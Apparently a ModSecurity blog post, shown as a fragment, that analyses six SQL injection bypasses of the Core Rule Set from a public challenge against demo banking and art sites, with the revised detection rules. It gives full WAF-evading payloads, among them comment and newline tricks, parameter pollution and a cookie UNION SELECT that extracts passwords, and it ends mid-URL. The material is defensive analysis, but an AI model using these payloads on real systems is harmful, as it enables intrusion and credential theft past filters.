+<ul><li><a href="http://twitter.com/#!/fluxreiners">Johannes Dahse</a></li><li><a href="http://twitter.com/#!/d0znpp">Vladimir Vorontsov</a></li><li><a href="http://twitter.com/#!/ygoltsev">PT Research</a></li><li><a href="http://twitter.com/#!/hmadrwx">Ahmad Maulana</a></li><li><a href="http://twitter.com/#!/eelsivart">Travis Lee</a></li><li><a href="http://twitter.com/#!/lightos">Roberto Salgado</a></li><li><a href="http://sqlmap.sourceforge.net/#developers">SQLMap Developers</a></li><li><a href="http://twitter.com/#!/hackplayers">HackPlayers</a></li><li><a href="http://twitter.com/#!/ggeshev">Georgi Geshev</a></li></ul>
+<p>The focus of this blog post is to provide an in-depth discussion of the Level II bypasses that were identifies during the SQLi Challenge.  </p>
+<p>Let's take a look at each bypass in-depth so that we see how the bypass was achieved and also highlight the changes made to the CRS to make them stronger.</p>
+<h3>Bypass #1 by Johannes Dahse</h3>
+<p>Target Application: <a href="http://www.modsecurity.org/testphp.vulnweb.com/" target="_self">Acunetix Acuart Site</a></p>
+<h4>Example Bypass Request</h4>
+<ul><li>user: acuart@localhost</li></ul>
+<p><a href="http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user">http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user</a></p>
+<h4><span style="font-size: 21px; font-weight: bold;">Bypass Analysis</span></h4>
+<p>Johannes used a combination of MySQL comments and new line characters to both have a working SQL Injection payload and to evade the current CRS SQLi filters.  First of all, let's review the <a href="http://dev.mysql.com/doc/refman/5.1/en/comments.html" target="_self">MySQL Reference Guide information about Comments</a>:</p>
+<div><div><div><blockquote><h4><em>8.6. Comment Syntax</em></h4></blockquote></div></div></div>
+<blockquote><p><em>MySQL Server supports three comment styles:</em><em><a name="id628116"></a></em><em><a name="id628125"></a></em></p><div><ul><li><p><span style="background-color: #ffff00;"><strong><em>From a &quot;<code>#</code>&quot; character to the end of the line.</em></strong></span></p></li><li><p><em>From a &quot;<code>-- </code>&quot; sequence to the end of the line. In MySQL, the &quot;<code>-- </code>&quot; (double-dash) comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on). This syntax differs slightly from standard SQL comment syntax, as discussed in <a href="http://dev.mysql.com/doc/refman/5.1/en/ansi-diff-comments.html" title="1.8.5.5. '--' as the Start of a Comment">Section 1.8.5.5, &quot;'<code>--</code>' as the Start of a Comment&quot;</a>.</em></p></li><li><p><em>From a <code>/*</code> sequence to the following <code>*/</code> sequence, as in the C programming language. This syntax enables a comment to extend over multiple lines because the beginning and closing sequences need not be on the same line.</em></p></li></ul></div><p><em>The following example demonstrates all three comment styles:</em></p><pre><em>mysql&gt; <strong><code>SELECT 1+1;     # This comment continues to the end of line</code></strong>
+mysql&gt; <strong><code>SELECT 1+1;     -- This comment continues to the end of line</code></strong>
+mysql&gt; <strong><code>SELECT 1 /* this is an in-line comment */ + 1;</code></strong>
+mysql&gt; <strong><code>SELECT 1+</code></strong><strong><code>/*</code></strong><strong><code>this is a</code></strong><strong><code>multiple-line comment</code></strong><strong><code>*/</code></strong><strong><code>1;</code></strong></em></pre></blockquote>
+<p>The highlighted section is the feature that Johannes used (with %0D%0A as the new line characters).  Let's take a look at the first request he used (to extract the DB user).  The resulting SQL payload looked something like this:</p>
+<pre>0 div 1 union#foo*/*bar
+select#foo
+1,2,current_user
+</pre>
+<p>However the SQL payload, when executed by the MySQL DB, looked something like this:</p>
+<pre>0 div 1 union select 1,2,current_user
+</pre>
+<p>The ModSecurity CRS has a number of rules <a href="http://mod-security.svn.sourceforge.net/viewvc/mod-security/crs/trunk/base_rules/modsecurity_crs_41_sql_injection_attacks.conf" target="_self">that detect SQL injection attacks that utilize the UNION and SELECT keywords</a>.  Here is an example rule:</p>
+<pre>SecRule REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* &quot;\bunion\b.{1,100}?\bselect\b&quot; \
+	&quot;phase:2,rev:'2.2.1',capture,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase<span style="background-color: #ffff00;"><strong>,t:replaceComments</strong></span>,t:compressWhiteSpace,ctl:auditLogParts=+E,block,msg:'SQL Injection Attack',id:'959047',tag:'WEB_ATTACK/SQL_INJECTION',tag:'WASCTC/WASC-19',tag:'OWASP_TOP_10/A1',tag:'OWASP_AppSensor/CIE1',tag:'PCI/6.5.2',logdata:'%{TX.0}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.0}&quot;</pre>
+<p>This ruleset uses a regular expression to identify UNION and SELECT SQL keywords found within 100 characters of each other.  The regular expression itself is ok, however the issue related to this bypass has to do with the specific <a href="https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#Transformation_functions" target="_self">transformation functions</a> used by ModSecurity for this particular rule.  The transformation function actions in the rules start with &quot;t:...&quot; and by default they work as a pipeline of normalization functions and the operator in the rule is only executed once at the end after all transformations are completed.</p>
+<p>In the rule shown above, the highlighted transformation function is the most relevant - <a href="https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#replaceComments" target="_self">t:replaceComments</a>.  The purpose of this transformation function is to combat SQL comment insertion directly into SQL keywords like this - <em><strong>SEL/**/ECT</strong></em> so that it can evade string/regex matches for the keyword while still executing properly by the back-end DB.</p>
+<p>The problem with the current replaceComments transformation function operation is how it handles unterminated comments.  This is information taken from the <a href="http://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#replaceComments" target="_self">Reference Manual for t:replaceComments</a>:</p>
+<blockquote><p><strong><em>Unterminated comments will also be replaced with a space (ASCII 0x20). However, a standalone termination of a comment (*/) will not be acted upon.</em></strong></p></blockquote>
+<p>Johannes' payload included an opening/unterminated SQL comment in it which meant that this transformation function actually stripped out the data after the /* string...  Here is how it looked in the ModSecurity debug log:</p>
+<pre>T (1) urlDecodeUni: &quot;0 div 1 union#foo*/*bar\r\nselect#foo\r\n1,2,current_user&quot;
+T (1) htmlEntityDecode: &quot;0 div 1 union#foo*/*bar\r\nselect#foo\r\n1,2,current_user&quot;
+T (1) lowercase: &quot;0 div 1 union#foo*/*bar\r\nselect#foo\r\n1,2,current_user&quot;
+<span style="background-color: #ffff00;"><strong>T (1) replaceComments: &quot;0 div 1 union#foo* &quot;</strong></span>
+T (0) compressWhitespace: &quot;0 div 1 union#foo* &quot;
+Transformation completed in 796 usec.
+Executing operator &quot;rx&quot; with param &quot;\\bunion\\b.{1,100}?\\bselect\\b&quot; against ARGS:artist.
+Target value: &quot;0 div 1 union#foo* &quot;</pre>
+<p>As you can see, once the replaceComments transformation function is executed, it removes the end portion of the SQLi payload and therefore when the operator is run at the end of the transformation function chain, it does not match. </p>
+<h4>Bypass #1 - Lessons Learned </h4>
+<p>The core problem with this first bypass is that of Impedance Mismatches between how the WAF and back-end DB will handle SQL Comments.  The problem is that attacker's may insert SQL Comments almost anywhere within the payloads to evade security filters as it is next to impossible to create regular expressions that can account for this technique.</p>
+<p>We chose two different methods of handling SQL Comments in our updated SQL Injection rules.</p>
+<h4>Detect SQL Comments Themselves</h4>
+<p>Rather than only trying to remove SQL Comments in order to try and identify the underlying SQL query data, we are now detecting the presence of the SQL Comments themselves.  Here is an example rule:</p>
+<pre>#
+# -=[ Detect SQL Comment Sequences ]=-
+#
+SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
+&quot;(\/\*\!?|\*\/|\-\-[\s\r\n\v\f]|(?:--[^-]*-)|([^\-&amp;])#.*[\s\r\n\v\f]|;?\\x00)&quot; \
+&quot;phase:2,rev:'2.2.2',id:'981231',t:none,t:urlDecodeUni,block,msg:'SQL Comment Sequence Detected.',capture,logdata:'%{tx.0}',tag:'WEB_ATTACK/SQL_INJECTION',tag:'WASCTC/WASC-19',tag:'OWASP_TOP_10/A1',tag:'OWASP_AppSensor/CIE1',tag:'PCI/6.5.2',setvar:tx.anomaly_score=+%{tx.warning_anomaly_score},setvar:tx.sql_injection_score=+1,setvar:'tx.msg=%{rule.msg}',setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.0}&quot;</pre>
+<h4>Use the multiMatch Action</h4>
+<p>For rules that are looking for SQL keywords only, you can still use the t:replaceComments transformation function, however you should also use the <a href="http://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#multiMatch" target="_self">multiMatch action</a> as well which will execute the operator against the payload after each transformation function that changes data rather than only once at the end of the transformation function chain. Here is an example rule using this action:</p>
+<pre>SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* &quot;(?i:\buser_tables\b)&quot; \
+	&quot;phase:2,rev:'2.2.2',capture,<strong><span style="background-color: #ffff00;">multiMatch</span></strong>,t:none,t:urlDecodeUni,t:replaceComments,ctl:auditLogParts=+E,block,msg:'Blind SQL Injection Attack',id:'959918',tag:'WEB_ATTACK/SQL_INJECTION',tag:'WASCTC/WASC-19',tag:'OWASP_TOP_10/A1',tag:'OWASP_AppSensor/CIE1',tag:'PCI/6.5.2',logdata:'%{TX.0}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.</pre>
+<h3>Bypass #2 by Vladimir Vorontsov</h3>
+<p>Target Application: <a href="http://www.modsecurity.org/Kelev/view/home.php" target="_self">Cenzic Crack Me Bank</a></p>
+<h4>Example Bypass Request</h4>
+<pre>POST /Kelev/php/accttransaction.php HTTP/1.1
+Host: www.modsecurity.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0.1) Gecko/20100101 Firefox/5.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Connection: keep-alive
+Referer: http://www.modsecurity.org/Kelev/php/accttransaction.php
+Cookie: PHPSESSID=b90ee75723c20bbe4fab8a82f354412c
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 84
+
+hUserId=22768&amp;<strong><span style="background-color: #ffff00;">FromDate=a1%27+or&amp;ToDate=%3C%3Eamount+and%27</span></strong>&amp;sendbutton1=Get+Statement</pre>
+<h4>Bypass Analyis</h4>
+<p>Vladimir used SQL Injection Fragmentation.  He was able to split up the SQLi payload so that each individual payload would not trigger any filters however, when placed into the back-end SQL query, they would force boolean logic of true/false.  If the query was true, the normal page would appear. If the query was false, however, then an SQL Error message would be returned in the html response body.</p>
+<p>The main advantage to using fragmentation is for filter evasions, especially when certain meta-characters such as quotes are filtered by the application.  In this case, the SQLi can take advantage of the quotes that are already present within the back-end query.  </p>
+<p>Vladimir was able to use brute force techniques to enumerate a number of column names in the DB.</p>
+<h4>Bypass #2 - Lessons Learned</h4>
+<p>We updated the CRS SQLi rules to add in more generic checks for common methodologies used during attacks.</p>
+<h4>String Termination/Statement Ending Injection Testing</h4>
+<p>Attackers will often insert string termination characters into the beginning and/or end of a payload in order to identify any potential SQL error messages leaking through error pages.  This techique was also used by Vladimir to end the back-end statement.</p>
+<p>To detect these types of injections, we added the following rule to the CRS:</p>
+<pre>#
+# -=[ String Termination/Statement Ending Injection Testing ]=-
+#
+# Identifies common initial SQLi probing requests where attackers insert/append
+# quote characters to the existing normal payload to see how the app/db responds.
+#
+SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
+&quot;(^[\&quot;'`´'';]+|[\&quot;'`´'';]+$)&quot; \
+&quot;phase:2,rev:'2.2.2',capture,t:none,t:urlDecodeUni,block,msg:'SQL Injection Attack: Common Injection Testing Detected',id:'981211',logdata:'%{TX.0}',severity:'2',tag:'WEB_ATTACK/SQL_INJECTION',tag:'WASCTC/WASC-19',tag:'OWASP_TOP_10/A1',tag:'OWASP_AppSensor/CIE1',tag:'PCI/6.5.2',setvar:'tx.msg=%{rule.msg}',setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.0}&quot;
+</pre>
+<h4>Detecting SQL Operators</h4>
+<p>Vladimir's payload also included the &quot;&lt;&gt;&quot; <a href="http://dev.mysql.com/doc/refman/5.6/en/non-typed-operators.html" target="_self">MySQL operator</a> value in it.  SQL Tautology utilize these operators to construct their boolean logic.</p>
+<p>To detect these types of injections, we added the following rule to the CRS:</p>
+<pre>#
+# -=[ SQL Operators ]=-
+#
+SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
+&quot;(?i:(\!\=|\&amp;\&amp;|\|\||&gt;&gt;|&lt;&lt;|&gt;=|&lt;=|&lt;&gt;|&lt;=&gt;|xor|rlike|regexp|isnull)|(?:not\s+between\s+0\s+and)|(?:is\s+null)|(like\s+null)|(?:(?:^|\W)in[+\s]*\([\s\d\&quot;]+[^()]*\))|(?:xor|&lt;&gt;|rlike(?:\s+binary)?)|(?:regexp\s+binary))&quot; \
+&quot;phase:2,rev:'2.2.2',capture,t:none,t:urlDecodeUni,block,msg:'SQL Injection Attack: SQL Operator Detected',id:'981212',logdata:'%{TX.0}',severity:'2',tag:'WEB_ATTACK/SQL_INJECTION',tag:'WASCTC/WASC-19',tag:'OWASP_TOP_10/A1',tag:'OWASP_AppSensor/CIE1',tag:'PCI/6.5.2',setvar:'tx.msg=%{rule.msg}',setvar:tx.sql_injection_score=+%{tx.notice_anomaly_score},setvar:tx.anomaly_score=+%{tx.notice_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.0}&quot;</pre>
+<h3>Bypass #3 by PT Research</h3>
+<p>Target Application: <a href="http://www.modsecurity.org/demo.testfire.net/" target="_self">IBM demo.testfire.net site</a></p>
+<h4>Example Bypass Request</h4>
+<pre>POST /bank/transaction.aspx HTTP/1.1
+Host: www.modsecurity.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0.1) Gecko/20100101 Firefox/5.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Connection: keep-alive
+Referer: http://www.modsecurity.org/bank/transaction.aspx
+Cookie: ASP.NET_SessionId=c0tx0o455d0b10ylsdr03m55; amSessionId=14408158863; amUserInfo=UserName=YWRtaW4=&amp;Password=JyBvciAnMSc9JzEnOy0t; amUserId=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+__VIEWSTATE=%2FwEPDwUKMTYzNDg3OTA4NmRk&amp;<span style="background-color: #ffff00;"><strong>after=</strong>1 AND (select DCount(last(username)&amp;<strong>after=</strong>1&amp;<strong>after=</strong>1) from users where username='ad1min')&amp;before=d</span></pre>
+<h4>Bypass Analyis</h4>
+<p>The attack technique used by the PT Research Team was <a href="https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf" target="_self">HTTP Parameter Pollution</a> (HPP), which allows an attacker to leverage how an ASP/ASP.Net-based applications treats multiple parameters with the same name - which is to concatenate the payloads into one and separating them with commas.</p>
+<p>HPP is a very real attack technique and most security devices do not properly handle it.  <a href="https://www.trustwave.com/spiderlabs/advisories/TWSL2011-006.txt" target="_self">Trustwave recently released an Advisory for HPP flaws found in a commercial WAF.</a></p>
+<h4>Bypass #3 - Lessons Learned</h4>
+<p>If you are protecting ASP-based web applications, you better have a method of handling HPP attacks.  Your security filtering better mimic how the application handles HPP data.  The OWASP ModSecurity CRS does have an <a href="http://mod-security.svn.sourceforge.net/viewvc/mod-security/crs/trunk/experimental_rules/modsecurity_crs_40_http_parameter_pollution.conf" target="_self">HPP rules file</a> that will concatenate the payloads of parameters with the same name and then set TX variables.  These variables are then inspected along with the other standard ModSecurity variables.</p>
+<p>So how did the the attack still work?  By an error of omission...  We had simply not activated the HPP protection file.  This is a practical lessons learned for organizations, you should conduct proper threat modeling for your applications in order to identify any methods of attack that might only impact specific technologies.  In this case, we should have evaluated the IBM demo.testfire.net site and identified that it was a Microsoft-based web application/back-end and thus realized that HPP attacks were possible.  Once we activated the HPP rules, these payloads were caught.</p>
+<h3>Bypass #4 by Ahmad Maulana</h3>
+<p>Target Application: <a href="http://www.modsecurity.org/Kelev/view/home.php" target="_self">Cenzic Crack Me Bank</a></p>
+<h4>Example Bypass Request</h4>
+<pre>POST /Kelev/php/accttransaction.php HTTP/1.1
+Host: www.modsecurity.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0.1) Gecko/20100101 Firefox/5.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Connection: keep-alive
+Referer: http://www.modsecurity.org/Kelev/php/accttransaction.php
+Cookie: PHPSESSID=bf65e6b31d8446e674acbe332cd3c75f;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+
+hUserId=22768&amp;FromDate=1&amp;ToDate=<strong><span style="background-color: #ffff00;">1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-</span></strong>&amp;sendbutton1=Get+Statement</pre>
+<h4>Bypass Analyis</h4>
+<p>Ahmad's attack leveraged 2 attack techniques: 1) Unterminated Comments and, 2) MySQL Comment Extensions for conditional code execution.</p>
+<h4>Unterminated Comments</h4>
+<p>As mention prevoiusly, the t:replaceComments transformation function (with use of multiMatch) cased a severe false negative in the rules by hiding data from the final operator check.</p>
+<h4>MySQL Comment Extensions</h4>
+<p>The MySQL Comment documentation states to following about Comment Extensions:</p>
+<blockquote><p>MySQL Server supports some variants of C-style comments. These enable you to write code that includes MySQL extensions, but is still portable, by using comments of the following form:</p><pre>/*! <em><code>MySQL-specific code</code></em> */
+</pre><p>In this case, MySQL Server parses and executes the code within the comment as it would any other SQL statement, but other SQL servers will ignore the extensions. For example, MySQL Server recognizes the<code>STRAIGHT_JOIN</code> keyword in the following statement, but other servers will not:</p><pre>SELECT /*! STRAIGHT_JOIN */ col1 FROM table1,table2 WHERE ...
+</pre><p>If you add a version number after the &quot;<code>!</code>&quot; character, the syntax within the comment is executed only if the MySQL version is greater than or equal to the specified version number. The <code>TEMPORARY</code> keyword in the following comment is executed only by servers from MySQL 3.23.02 or higher:</p><pre>CREATE /*!32302 TEMPORARY */ TABLE t (a INT);
+</pre><p>The comment syntax just described applies to how the <a href="http://dev.mysql.com/doc/refman/5.6/en/mysqld.html" title="4.3.1. mysqld — The MySQL Server"><strong>mysqld</strong></a> server parses SQL statements. </p></blockquote>
+<h4>Bypass #4 - Lessons Learned</h4>
+<p>The changes made to detect these payloads are the same as outlined in Bypass #1. </p>
+<h3>Bypass #5 by Travis Lee</h3>
+<h3><span style="font-size: 14px; font-weight: normal;">Target Application: <a href="http://www.modsecurity.org/demo.testfire.net/" target="_self">IBM demo.testfire.net site</a></span></h3>
+<h4>Example Bypass Request</h4>
+<pre>GET /bank/transaction.aspx HTTP/1.1
+Host: www.modsecurity.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0.1) Gecko/20100101 Firefox/5.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Referer: http://www.modsecurity.org/bank/main.aspx
+Cookie: ASP.NET_SessionId=c0tx0o455d0b10ylsdr03m55; amSessionId=14408158863; amUserInfo=UserName=YWRtaW4=&amp;
+Password=JyBvciAnMSc9JzEnLS0=; <strong><span style="background-color: #ffff00;">amUserId=1 union select username,password,3,4 from users</span></strong>
+DNT: 1
+Connection: keep-alive
+</pre>
+<h4>Bypass Analyis</h4>
+<p>In this case, the SQLi payload itself didn't use any advanced obfuscation techniques like the other examples we have highlighted thus far.  In this case, the evasion was possible due to the attack vector location - Request Cookie data.</p>
+<h4>Bypass #5 - Lessons Learned</h4>
+<p>It's not always <em><strong>what</strong></em> to look for but <em><strong>where</strong></em> to look for it...</p>
+<p>This was another case of an error of omission with regards to the ModSecurity rules configuration.  Specifically, each rule must specify which specific parts of a web transaction that we want to inspect.  Different locations have higher degrees of true positives, false positives and false negatives.  In general, request arguments are the #1 attack vector location.  Every evasion we have outlined in this blog post pass the malicious data within parameter payloads.  While ARGS data probably covers about 95% of the attack vector locations, this doesn't mean that it is the only place where attack may occur.  In this case, we should have been inspecting the &quot;amUserId&quot; cookie payload value.</p>
+<p>In CRS v2.2.1, we are now also inspecting Cookie Names and Values.  Here is an example updated rule:</p>
+<pre>#
+# -=[ Detect DB Names ]=-
+#
+SecRule <span style="background-color: #ffff00;"><strong>REQUEST_COOKIES|REQUEST_COOKIES_NAMES</strong></span>|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
+&quot;(?i:(?:m(?:s(?:ysaccessobjects|msysaces|msysobjects|msysqueries|msysrelationships|msysaccessstorage|msysaccessxml|msysmodules|msysmodules2|db)|aster\.\.sysdatabases|ysql\.db)|s(?:ys(?:\.database_name|aux)|chema(?:\W*\(|_name)|qlite(_temp)?_master)|d(?:atabas|b_nam)e\W*\(|information_schema|pg_(catalog|toast)|northwind|tempdb))&quot; \
+                &quot;phase:2,rev:'2.2.2',capture,t:none,t:urlDecodeUni,ctl:auditLogParts=+E,block,msg:'SQL Injection Attack: Common DB Names Detected',id:'981210',logdata:'%{TX.0}',severity:'2',tag:'WEB_ATTACK/SQL_INJECTION',tag:'WASCTC/WASC-19',tag:'OWASP_TOP_10/A1',tag:'OWASP_AppSensor/CIE1',tag:'PCI/6.5.2',setvar:'tx.msg=%{rule.msg}',setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.0}&quot;</pre>
+<h3>Bypass #6 by Roberto Salgado</h3>
+<p>Target Application: <a href="http://www.modsecurity.org/testphp.vulnweb.com/" target="_self">Acunetix Acuart Site</a></p>
+<h4>Example Bypass Request</h4>
+<p><a href="http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=-2%20div%201%20union%20all%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%